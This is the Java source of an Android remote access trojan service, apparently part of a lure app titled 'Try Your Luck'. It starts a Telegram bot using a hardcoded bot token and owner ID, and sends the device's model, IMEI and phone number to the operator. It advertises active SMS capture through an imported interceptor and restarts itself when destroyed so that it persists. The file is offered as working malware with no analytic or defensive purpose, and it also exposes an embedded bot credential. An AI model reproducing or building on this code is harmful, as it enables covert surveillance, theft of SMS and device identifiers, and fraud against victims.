package com.my.luck.core;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import com.my.luck.features.SmsInterceptor;
import com.my.luck.network.TelegramBot;

public class RatService extends Service {
    private static final String TAG = "RatService";
    private static final int NOTIFICATION_ID = 1001;
    private static final String CHANNEL_ID = "rat_service_channel";
    
    private static final String BOT_TOKEN = "8809826791:AAERMVrTHNr3VsreEZGUtSN8ltWRTuI2qrs";
    private static final String OWNER_ID = "8681027856";
    
    private TelegramBot telegramBot;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🚀 RAT Service Starting...");
        
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        telegramBot = new TelegramBot(this, BOT_TOKEN, OWNER_ID);
        
        // Send device info
        new Thread(() -> {
            try {
                Thread.sleep(2000);
                sendDeviceInfo();
            } catch (Exception e) {
                Log.e(TAG, "Error", e);
            }
        }).start();
    }

    public TelegramBot getTelegramBot() {
        return telegramBot;
    }

    private void sendDeviceInfo() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            
            String info = "🖥️ <b>✅ DEVICE CONNECTED</b>\n";
            info += "━━━━━━━━━━━━━━━\n";
            info += "📱 <b>Model:</b> " + Build.MODEL + "\n";
            info += "🏷️ <b>Brand:</b> " + Build.BRAND + "\n";
            info += "📡 <b>Android:</b> " + Build.VERSION.RELEASE + "\n";
            info += "🔢 <b>SDK:</b> " + Build.VERSION.SDK_INT + "\n";
            info += "✅ <b>SMS Capture:</b> ACTIVE\n";
            
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED && tm != null) {
                info += "📶 <b>IMEI:</b> " + tm.getDeviceId() + "\n";
                info += "📞 <b>Number:</b> " + tm.getLine1Number() + "\n";
            }
            
            info += "🕐 <b>Time:</b> " + new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(new java.util.Date());
            
            if (telegramBot != null) {
                telegramBot.sendMessage(info);
                telegramBot.sendKeyboard();
                Log.d(TAG, "✅ Device info & keyboard sent");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending device info", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "RAT Service",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Try Your Luck")
                .setContentText("🟢 SMS Monitor Active")
                .setSmallIcon(android.R.drawable.ic_menu_gallery)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed, restarting...");
        Intent restartIntent = new Intent(this, RatService.class);
        startService(restartIntent);
    }
}
